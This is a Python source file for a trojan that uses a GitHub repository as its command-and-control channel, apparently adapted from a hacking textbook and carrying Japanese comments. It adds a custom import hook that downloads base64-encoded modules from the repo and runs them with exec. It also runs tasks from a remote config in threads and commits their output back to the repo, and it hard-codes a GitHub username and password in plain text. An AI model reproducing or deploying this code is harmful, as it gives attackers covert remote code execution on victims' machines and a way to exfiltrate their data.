# -*- coding: utf-8 -*-

import json
import base64
import sys
import time
import types
import random
import threading
import queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "{}.json".format(trojan_id)
trojan_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

class GitImporter():
    def __init__(self):
        self.current_module_code = " "

    def find_module(self, fullname, path=None):
        global configured
        if configured:
            print("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module

        return module

def connect_to_github():
    gh = login('tikibms', '0709ketag')
    repo = gh.repository('tikibms', 'chapter7')
    #branch = repo.branch("master")
    branch = 0

    return gh, repo, branch

def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()
    #新しいコミットだけ取り出す
    commit = repo.commits().next()
    tree = repo.tree(commit.sha).recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file {}".format(filepath))
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config      = json.loads(base64.b64decode(config_json).decode())
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import {}".format(task['module']))

    return config

def store_module_result(data):

    gh, repo, branch = connect_to_github()
    remote_path = "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return

def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    #レポジトリに結果を保存する
    store_module_result(result.encode())

    return

#トロイの木馬のメインループ
sys.meta_path.insert(0, GitImporter())

while True:

    if task_queue.empty():

        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))